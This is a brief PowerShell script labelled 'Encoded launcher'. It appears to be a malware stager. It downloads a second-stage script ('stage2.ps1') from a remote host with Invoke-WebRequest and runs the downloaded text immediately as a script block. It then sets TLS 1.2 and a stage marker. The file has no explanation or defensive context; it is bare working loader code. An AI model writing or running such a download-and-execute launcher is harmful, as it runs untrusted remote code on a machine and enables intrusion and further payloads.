# Encoded launcher
$DownloadUrl = 'https://internal.corp/stage2.ps1'
$PayloadText = (iwr $DownloadUrl -UseBasicParsing).Content
[ScriptBlock]::Create($PayloadText).Invoke()
[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
$StageMarker = "stage-15"
